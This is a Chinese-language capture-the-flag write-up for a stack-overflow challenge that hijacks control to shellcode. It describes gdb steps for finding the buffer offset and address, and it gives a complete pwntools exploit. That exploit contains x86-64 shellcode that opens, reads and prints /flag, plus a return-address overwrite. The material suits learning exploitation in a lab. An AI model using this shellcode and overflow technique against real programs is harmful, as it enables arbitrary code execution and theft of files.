# 挑战简介
```
这道题的的难度将不再是前面所有的题可以比拟的,如果说前面的题仅仅看IDA便可得知,那么这道题,将带你完完全全理解栈这个东西
```

# 思路
做了有两天,这道题的内核非常简单,只不过你要对gdb有特别熟练的应用  
首先,说操作流程,
- 你要从easy给你的那个栈视图入手,你要做的,无非就两件事:第一,找到buffer偏移量.第二:找到buffer的初始位置.
- 第一个无需多言,重点是第二个
- 你需要知道buffer初始的rsp的位置,固定的是rsp+0x20,我无法从IDA中查询rsp的位置,或许我不会操作
- 因此,我必须要用gdb,调试鼻祖

让我们看一下操作,有以下几个关键操作
- display/8gx $rsp:显示rsp的栈位置,以及存储的Data,8可以是任意数,这道题越大越好,最好20以上,以便理清rsp的具体情况
- display/8i $rip:显示执行中的语句,8同上
- 以上两种调试方法是动态的
- 设置几个关键断点,我这里是read,challenge函数,执行到read的时候,注重观察rsp的情况,你会发现,其实和easy题展示给你的栈视图是差不多的
- 一定要从初始ni开始走,不要jump,和c语言的道理一样,不要jump,因为jump总会错过一些重要语句
- 目前还是遇到了一个不理解的情况,在我没有栈溢出的时候,buffer从0x00007fffffffce90开始,但是栈溢出后,却从0x00007fffffffceb0开始了,和easy一样,额外加了0x20

以上就是gdb的具体操作  

以下  
```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)
p = process('/challenge/binary-exploitation-hijack-to-shellcode')

#nop_sled_length = 0x900

#nop_sled = asm('nop') * nop_sled_length

shellcode = asm('''
    xor rax, rax                      # 清理rax
    push rax                          # 将0压入栈顶，代替NULL字节
    mov rbx, 0x67616c662f6a6a6a           # 将'/flag'分成两部分，避免NULL字节
    shr rbx, 24                        # 对齐
    push rbx                          # 推入栈
    mov rdi, rsp                      # rsp指向flag, 替代rdi
    xor rsi, rsi                      # 清理rsi
    xor rdx, rdx                      # 清理rdx
    mov al, 2                         # 执行打开指令 (使用al代替rax避免NULL字节)
    syscall                           # open('/flag', O_RDONLY)

    mov rdi, rax                      # 文件描述符
    mov rsi, rsp                      # 移动缓冲区进栈
    mov dl, 100                       # 读取的字节数 (使用dl代替rdx避免NULL字节)
    xor rax, rax                      # 执行读取指令
    syscall                           # read(fd, buffer, 0x100)

    mov dil, 1                        # 输出描述符 (使用edi代替rdi避免NULL字节)
    mov al, 1                         # 执行写入 (使用al代替rax避免NULL字节)
    syscall                           # write(stdout, buffer, 0x100)

''')

# 构建payload
#payload_o = nop_sled + shellcode

#payload = payload_o.ljust(0x1000, b'\x90')  # 填充剩余空间为NOP指令
print(len(shellcode))

p.recvuntil('Send your payload (up to 4096 bytes)!\n')

win_address = p64(0x00007fffffffceb0)

p.send(shellcode + b'\x00' * 0x14 + win_address)

output = p.recvall()
print(output.decode(errors='ignore'))
```

这道综合题还是非常有趣的,那么...  
**完结撒花**

